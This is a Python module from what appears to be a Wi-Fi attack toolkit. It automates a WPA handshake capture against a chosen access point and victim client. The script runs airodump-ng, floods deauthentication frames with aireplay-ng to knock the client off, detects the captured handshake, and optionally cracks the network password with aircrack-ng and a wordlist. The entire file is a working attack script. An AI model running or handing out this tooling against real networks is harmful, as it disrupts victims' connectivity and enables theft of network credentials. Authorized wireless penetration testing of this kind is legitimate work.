"""attack/handshake-dual — handshake capture using two monitor adapters."""

from __future__ import annotations

import subprocess
import time
from pathlib import Path

from wifipi.module import Module, RunContext
from wifipi.options import OptionSpec
from wifipi.procutil import popen as procutil_popen, run as run_proc, terminate


class HandshakeDual(Module):
    NAME = "attack/handshake-dual"
    CATEGORY = "attack"
    DESCRIPTION = "Handshake capture using separate MON_IFACE (airodump) and ATTACK_IFACE (deauth)."
    OPTIONS = {
        "BSSID":    OptionSpec(required=True,  description="Target AP BSSID.", kind="bssid"),
        "CLIENT":   OptionSpec(required=True,  description="Victim MAC.", kind="mac"),
        "CHANNEL":  OptionSpec(required=True,  description="AP channel.", kind="int"),
        "TIMEOUT":  OptionSpec(required=False, default="120",
                               description="Give up after N seconds.", kind="int"),
        "WORDLIST": OptionSpec(required=False, default=None,
                               description="If set, auto-crack with this wordlist.", kind="path"),
    }
    REQUIRES_TOOLS = ["airodump-ng", "aireplay-ng", "aircrack-ng", "iw"]
    BLOCKING = True
    REQUIRES_CONFIRMATION = True
    LOOT_SUBDIR = "handshakes"

    def run(self, ctx: RunContext) -> int:
        cap_iface = ctx.options.get("MON_IFACE")
        atk_iface = ctx.options.get("ATTACK_IFACE")
        if not cap_iface or not atk_iface:
            print("[x] MON_IFACE and ATTACK_IFACE must both be set")
            return 2
        if cap_iface == atk_iface:
            print("[x] MON_IFACE and ATTACK_IFACE must be different adapters")
            return 2

        bssid = ctx.options["BSSID"]
        client = ctx.options["CLIENT"]
        channel = str(ctx.options["CHANNEL"])
        timeout = int(ctx.options.get("TIMEOUT", 120))
        wordlist = ctx.options.get("WORDLIST")

        prefix = ctx.loot_dir / "handshake"
        capfile = Path(str(prefix) + "-01.cap")

        run_proc(["iw", "dev", cap_iface, "set", "channel", channel])
        run_proc(["iw", "dev", atk_iface, "set", "channel", channel])

        airodump = procutil_popen(
            ["airodump-ng", "-c", channel, "--bssid", bssid, "-w", str(prefix), cap_iface],
            log_path=ctx.loot_dir / "airodump.log",
        )

        try:
            for _ in range(15):
                if capfile.exists():
                    break
                time.sleep(1)
            if not capfile.exists():
                print("[x] airodump didn't create capture")
                return 3

            deadline = time.time() + timeout
            round_ = 0
            while time.time() < deadline:
                round_ += 1
                print(f"[*] round {round_} — deauth on {atk_iface}")
                run_proc(
                    ["aireplay-ng", "--deauth", "5", "-a", bssid, "-c", client, atk_iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False,
                )
                for _ in range(5):
                    time.sleep(1)
                    if self._has_handshake(capfile, bssid):
                        print(f"[+] handshake captured in {capfile}")
                        if wordlist:
                            return self._crack(wordlist, bssid, capfile, ctx)
                        return 0
            print(f"[x] no handshake after {timeout}s")
            return 4
        finally:
            terminate(airodump)

    def _has_handshake(self, capfile: Path, bssid: str) -> bool:
        res = run_proc(
            ["aircrack-ng", "-b", bssid, str(capfile)],
            capture_output=True, text=True, stdin=subprocess.DEVNULL, check=False,
        )
        return "1 handshake" in res.stdout

    def _crack(self, wordlist: str, bssid: str, capfile: Path, ctx: RunContext) -> int:
        wl = Path(wordlist)
        if not wl.is_file():
            print(f"[x] wordlist not readable: {wordlist}")
            return 5
        with (ctx.loot_dir / "aircrack.log").open("ab") as fh:
            return run_proc(
                ["aircrack-ng", "-w", str(wl), "-b", bssid, str(capfile)],
                stdout=fh, stderr=fh,
            ).returncode
